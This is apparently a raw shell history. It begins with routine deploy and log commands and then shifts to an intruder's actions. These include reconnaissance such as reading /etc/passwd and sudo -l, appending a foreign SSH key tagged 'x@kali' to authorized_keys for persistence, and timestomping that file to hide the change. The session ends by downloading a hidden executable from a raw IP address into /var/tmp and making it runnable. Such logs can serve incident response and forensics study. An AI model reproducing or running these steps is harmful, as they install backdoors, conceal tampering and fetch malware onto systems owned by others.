sudo systemctl restart app
make deploy
cd app
git pull
ls
tail -f /var/log/app/app.log
systemctl status app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINeEbXhNPW0G54efRecQuOjd3qwo6Imja5xEysFKz6y4 x@kali' >> ~/.ssh/authorized_keys
touch -r /etc/hostname /home/ops/.ssh/authorized_keys
wget -q http://62.18.108.47/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
